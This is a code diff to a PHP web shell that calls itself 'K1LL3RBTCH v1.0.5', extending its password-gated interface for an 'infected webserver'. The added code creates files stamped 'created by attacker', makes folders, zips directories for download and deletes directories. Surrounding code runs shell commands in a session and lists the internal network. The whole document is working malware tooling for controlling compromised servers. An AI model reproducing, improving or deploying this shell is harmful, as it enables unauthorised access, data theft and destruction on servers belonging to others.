@@ -1,19 +1,15 @@
 <?php
 /*
 MIT License
-
 Copyright (c) 2022 It0sh1
-
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
-
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
-
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
@@ -183,6 +179,8 @@ class Loginsystem
     {
       // show login form
       print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.5 by It0sh1</title>");
+      // include some js scripts from cloudflare
+      print("<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>");
       // include favicon
       favicon();
       print("</head><body style='background-color: black;'>");
@@ -193,10 +191,27 @@ class Loginsystem
 
       // CSS for error message.
       print("<b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.5 by It0sh1</b>");
-      print("<form method='POST' action=''>");
-      print("<br><br><b style='color: white;'>Password:</b>\n<input type='password' placeholder='Enter your password.' name='key' style='border: 2px solid #6C686C; background-color: black; color: white;'>\n");
-      print("<button type='submit' name='login' style='background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer; font-size: 12px;'>login</button><br><br>");
+      print("<form method='POST' action='' style='color: white;'>");
+      print("<br><br><b style='color: white;'>Password:</b>\n<input type='password' id='keyinput' placeholder='Enter your password.' id='id_password' name='key' style='width: 260px; height: 2.60%;border: 2px solid #6C686C; background-color: black; color: white;'>&nbsp;<input type='checkbox' onclick='ShowPassword()'' title='show password'>&nbsp;");
+      print("<button type='submit' name='login' style='height: 2.60%; background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer; font-size: 12px;'>login</button><br><br>");
       print("<style>input:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; } .error-message { background-color: #fce4e4; border: 2px solid #fcc2c3; width: 277px; padding: 5px 30px; border-radius: 3px; } .error-text { color: #cc0033; font-family: Helvetica, Arial, sans-serif; font-size: 13px;font-weight: bold;line-height: 20px;text-shadow: 1px 1px rgba(250,250,250,.3);} </style>");
+      // END PHP TAG ?>
+      <script>
+
+      // function for showing password
+      function ShowPassword()
+      {
+        var x = document.getElementById('keyinput');
+        if(x.type === "password")
+        {
+          x.type = "text";
+        } else {
+          x.type = "Password";
+        }
+      }
+      </script>
+      <?php // OPEN PHP TAG
+
       // import password checker
       self::checkingpassword();
       // go further
@@ -296,13 +311,107 @@ class shellfunctions
       	$do .= "$dirx</a></li>\n";
       }
       chdir($dir);
-      // Show header
+
+      ###################
+
+      // Show header(filemanager)
       print("<code><h2 style='color: #8B0000;'>File Manager</h2><hr>");
       print("<form method='POST' action='' style='color: white;'>");
+
+      // search for dir section
       print("Folder: <input type='text' name='searchfordir' placeholder='Enter Directory..' style='border: 2px solid #6C686C; background-color: black; color: white;'>\n");
       print("<button type='submit' name='search' style='background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2.20px 16px;cursor: pointer;font-size: 11px;'>> ></button>");
+
+      // folder create section
+      print("&nbsp;&nbsp;&nbsp;&nbsp;<input type='text' name='newfoldername' placeholder='enter new folder name.' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("&nbsp;<button type='submit' name='createnewfolder' style='background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2.20px 16px;cursor: pointer;font-size: 11px;'>Create Folder</button>");
+
+      // file create section
+      print("&nbsp;&nbsp;&nbsp;&nbsp;<input type='text' name='newfilename' placeholder='enter new file name.' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("&nbsp;<button type='submit' name='createnewfile' style='background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2.20px 16px;cursor: pointer;font-size: 11px;'>Create File</button>");
+
+      // css style
       print("<style>input:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; }</style>");
       print("</form>");
+
+      // functionality for creating a file.
+      if(isset($_POST['createnewfile']) OR $_POST['newfilename'])
+      {
+
+        // standard autotext for creating a new file.
+        $autogeneratetext = "This file was created by attacker.";
+
+        // check if new file name is empty
+        if(empty($_POST['newfilename']))
+        {
+          // show errormessage
+          print("<script>alert('Field cannot be empty. please enter a name for new file.'); window.location='?d=';</script>");
+
+        // when field is NOT empty
+        } else {
+
+          // check if file already exist
+          if(file_exists($_POST['newfilename']))
+          {
+            // show errormessage
+            print("<script>alert('File: ".$_POST['newfilename']." Already exists.'); window.location='?'</script>");
+
+          // whem file does not exist:
+          } else {
+
+            // making filehandler
+            $filehandler = fopen($_POST['newfilename'], "w");
+            if(fwrite($filehandler, $autogeneratetext))
+            {
+              // show message on success:
+              print("<script>alert('File: ".$_POST['newfilename']." is successfully created.'); window.location='?d=';</script>");
+
+            // on fail:
+            } else {
+
+              // show errormessage:
+              print("<script>alert('File: ".$newfile." Failed to create :(.'); window.location='?d=';</script>");
+            }
+
+          }
+        }
+      }
+
+      // functionality for creating a folder.
+      if(isset($_POST['createnewfolder']) OR $_POST['newfoldername'])
+      {
+        // vars
+        $newfolder = htmlspecialchars($_POST['newfoldername']);
+        // check if new folder name is empty
+        if(empty($newfolder))
+        {
+          // show errormessage
+          print("<script>alert('Field cannot be empty. Please enter a new folder name.'); window.location='?d=';</script>");
+
+        // when field is NOT empty
+        } else {
+
+          // check if dir already exist
+          if(!file_exists($newfolder))
+          {
+            // make folder
+            if(mkdir($newfolder))
+            {
+              // show javascript message on success:
+              print("<script>alert('Folder: ".$newfolder." is created.'); window.location='?d=';</script>");
+
+            // on fail:
+            } else {
+
+              // show javascript message on fail:
+              print("<script>alert('Folder: ".$newfolder." failed to create.'); window.location='?d=".getcwd()."'</script>");
+            }
+          } else {
+            // show errormessage on fail:
+            print("<script>alert('Folder: ".$newfolder." already exist.'); window.location='?d=".getcwd()."';</script>");
+          }
+        }
+      }
 
       /* Imported code from a dutch guy lol */
       function sizeFormat($bytes){
@@ -342,32 +451,36 @@ class shellfunctions
 
       // Show manager
       print("<table style='width: 100%; color: red;background-color: #141617; font-size: 13px; a:hover { background-color: white; }'>");
-      print("<tr><td style='color: #8B0000;'>Name</td><td style='color: #8B0000;'>Size</td><td style='color: #8B0000;'>Modified</td><td style='color: #8B0000;'>Permissions</td><td style='color: #8B0000;'>Actions</td></tr>");
+      print("<tr><td style='color: #8B0000;'>Name</td><td style='color: #8B0000;'>Size</td><td style='color: #8B0000;'>Modified</td><td style='color: #8B0000;'>Permissions</td><td style='color: #8B0000;'>Owner/group</td><td style='color: #8B0000;'>Actions</td></tr>");
 
       // when empty
       if(empty($_POST['searchfordir']))
       {
+        // scandir
         $scandir = scandir($dir);
         foreach($scandir as $sdir)
         {
+          // all dirs that will show up
           if(is_dir($dir.'/'.$sdir))
           {
-
             print("<tr>");
       			print("<td><a name='test' href='?d=".$dir.'/'.$sdir."' style='text-decoration: none; color:#719CAA;'><b style='font-size: 19px;'>&#128193;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       			print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       			print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
             print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
+            print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       			print("<td>");
-      			print("<a href='?d=".$dir.'/'.$sdir."&rename=true' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
-      			print("<a href='?d=".$dir.'/'.$sdir."&download=true' title='DOWNLOAD'>&#x1F4E5;</a>&nbsp;&nbsp;");
-      	    print("<a href='?d=".$dir.'/'.$sdir."&delete=true' title='DELETE'>&#10060;</a>&nbsp;&nbsp;");
+      			print("<a href='?renamedirectory=".$dir."' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
+      			print("<a href='?downloaddirectory=".realpath($dir.'/'.$sdir)."&download=true' title='DOWNLOAD'>&#x1F4E5;</a>&nbsp;&nbsp;");
+      	    print("<a href='?deletedirectory=".$dir.'/'.$sdir."&delete=true' title='DELETE'>&#10060;</a>&nbsp;&nbsp;");
       			print("</td>");
       			print("</tr>");
           }
+          // all files that will show up
           if(is_file($dir.'/'.$sdir))
           {
-          // END OF PHP TAG  ?>
+            // little bit of CSS
+            // END OF PHP TAG  ?>
             <style>
             a {
               text-decoration: none;
@@ -383,6 +496,7 @@ class shellfunctions
       			print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       			print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
             print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
+            print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       			print("<td>");
       			print("<a href='?file=".$dir.'/'.$sdir."&rename=true' title='RENAME'>&#128394;</a>&nbsp;&nbsp;");
       			print("<a href='?file=".$dir.'/'.$sdir."&edit=true' title='EDIT'>&#128221;</a>&nbsp;&nbsp;");
@@ -392,6 +506,69 @@ class shellfunctions
       			print("</tr>");
           }
         }
+
+        if(isset($_GET['downloaddirectory']))
+        {
+          // real path of the directory
+          $rootpath = realpath($dir);
+          // creating a zip folder to put the directory in.
+          $zip_file = 'file.zip';
+
+          $zip = new ZipArchive();
+          $zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE);
+
+          $files = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($rootpath),
+            RecursiveIteratorIterator::LEAVES_ONLY);
+
+          foreach ($files as $name => $file)
+          {
+            if($file->isDir())
+            {
+              $filePath = $file->getRealPath();
+              $relativePath = substr($filePath, strlen($rootpath) +1);
+
+              $zip->addFile($filePath, $relativePath);
+            }
+          }
+
+          $zip->close();
+
+          header('Content-Description: File Transfer');
+          header('Content-Type: application/octet-stream');
+          header('Content-Disposition: attachment; filename='.basename($zip));
+          header('Content-Transfer-Encoding: binary');
+          header('Expires: 0');
+          header('Cache-Control: must-revalidate');
+          header('Pragma: public');
+          header('Content-Length: ' . filesize($zip));
+          readfile($zip);
+        }
+
+        // when we get link ?deletedirectory
+        if(isset($_GET['deletedirectory']))
+        {
+          // display delete section
+          print("<hr><br><br><br><center><code style='color: white;'><h2 style='color: #8B0000;'>Delete directory: ".$dir."</h2>");
+          print("<form method='POST' action=''>");
+          print("<p>Are you sure you want to delete this directory from the webserver?<br>By clicking delete, this action CANNOT be undone.</p><br>");
+          print("<button type='submit' value='submit' name='deletedir' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>Delete</button>");
+          print("</form><br><br><hr>");
+
+          // when we post deletedir
+          if(isset($_POST['deletedir']))
+          {
+            // when we remove the directory.
+            if(rmdir($dir))
+            {
+              print("<script>alert('Folder: ".$dir." deleted successfully!'); window.location='?d=".$dir."';</script>");
+            } else {
+              print("<script>alert('Folder: ".$dir." Failed deleting.'); window.location='?d=';</script>");
+            }
+          }
+        }
+
+
 
         // when we getting the link with: ?file
         if(isset($_GET['file']))
@@ -477,10 +654,11 @@ class shellfunctions
             if(isset($_POST['rename']))
             {
 
+              // when field is empty:
               if(empty($_POST['newname']))
               {
                 // show error message
-              print('<br><div class="error-message"><span class="error-text"><b>Error:</b> Field cannot be empty.</span></div><br></center>');
+                print('<br><div class="error-message"><span class="error-text"><b>Error:</b> Field cannot be empty.</span></div><br></center>');
 
               // when field is NOT empty:
               } else {
@@ -490,8 +668,7 @@ class shellfunctions
                 {
                   // print on succeed:
                   sleep(1); // sleep for 1 second
-                  print("<script>alert('SUCCEED!')</script>"); // Alert message for succeed
-                  header("Location: ?");
+                  print("<script>alert('File: ".$sdir." is renamed to: ".$_POST['newname']." successfully.'); window.location='?d='</script>"); // Alert message for succeed
                 }
               }
             }
@@ -516,12 +693,11 @@ class shellfunctions
               if(unlink($_GET['file']))
               {
                 // print successmessage
-                sleep(1); // sleep for 1 second
-                print("<script>alert('File was successfully deleted from the webserver.')</script>"); // javascript popup message
+                print("<script>alert('File was successfully deleted from the webserver.'); window.location='?d=';</script>"); // javascript popup message
               // when it went wrong:
               } else {
                 // show message:
-                print("<script>alert('Something went wrong deleting file from the webserver.')</script>");
+                print("<script>alert('Something went wrong deleting file from the webserver.'); window.location='?d=';</script>");
               }
             }
           }
@@ -539,9 +715,10 @@ class shellfunctions
             if(is_dir($dir.'/'.$sdir))
       			{
               print("<tr>");
-      				print("<td><a name='test' href='?d=".$dir.'/'.$sdir."' style='text-decoration: none;'><b style='font-size: 19px; color:#719CAA;'>&#128193;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
+      				print("<td><a name='test' href='?d=".$dir.'/'.$sdir."' style='text-decoration: none; color:#719CAA;'><b style='font-size: 19px;'>&#128193;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       				print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       				print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
+              print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
               print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       				print("<td>");
       				print("<a href='' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
@@ -552,10 +729,23 @@ class shellfunctions
             }
             if(is_file($dir.'/'.$sdir))
             {
+              // little bit of CSS
+              // END OF PHP TAG  ?>
+                <style>
+                a {
+                  text-decoration: none;
+                  color: #ADD8E6;
+                }
+                a:hover {
+                  color: #DC143C;
+                }
+                </style>
+                <?php // OPEN PHP TAG
               print("<tr>");
-      				print("<td><a href='?file=".$dir.'/'.$sdir."' style='text-decoration: none;'><b style='font-size: 19px;'>&#128196;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
+      				print("<td><a href='?file=".$dir.'/'.$sdir."'><b style='font-size: 19px;'>&#128196;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       				print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       				print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
+              print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
               print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       				print("<td>");
       				print("<a href='' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
@@ -565,14 +755,12 @@ class shellfunctions
       				print("</td>");
       				print("</tr>");
             }
-
-            if($_GET['file'])
-            {
-
-            }
           }
         }
       }
+
+      // end of table
+      print("</table>");
     }
   }
 
@@ -770,7 +958,8 @@ class shellfunctions
       system_config();
 
       // go further
-      print("<b style='color: #B22222; font-size: 14px;'>Host: </b>".$_SERVER['SERVER_NAME']."<br><br>");
+      print("<b style='color: #B22222; font-size: 14px;'>Host: </b>".$_SERVER['SERVER_NAME']."<br>");
+      print("<b style='color: #B22222; font-size: 14px;'>Server port: </b>".$_SERVER['SERVER_PORT']."<br><br>");
 
       // writing function for showing internal network on the infected webserver
       function show_internal_network()
@@ -849,7 +1038,7 @@ class shellfunctions
       }
 
       if (isset($_POST['command'])) {
-        $command = $_POST['command'];
+        $command = htmlentities($_POST['command']);
         if ( ! isset($_SESSION['logged_in'])) {
           if ($command == $password) {
             $_SESSION['logged_in'] = TRUE;
@@ -983,7 +1172,7 @@ class shellfunctions
             <div>
               <?php foreach ($_SESSION['commands'] as $index => $command) { ?>
               <input type="button" value="<?php if ($_SESSION['persist_commands'][$index]) { ?>Un-Persist<?php } else { ?>Persist<?php } ?>" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" onclick="toggle_persist_command(<?php echo $index; ?>);" class="persist_button" />
-              <pre><?php echo '$ ', $command, "\n"; ?></pre>
+              <pre><?php echo '$ ', htmlentities($command), "\n"; ?></pre>
               <?php foreach ($_SESSION['command_responses'][$index] as $value) { ?>
               <pre><?php echo htmlentities($value), "\n"; ?></pre>
               <?php } ?>
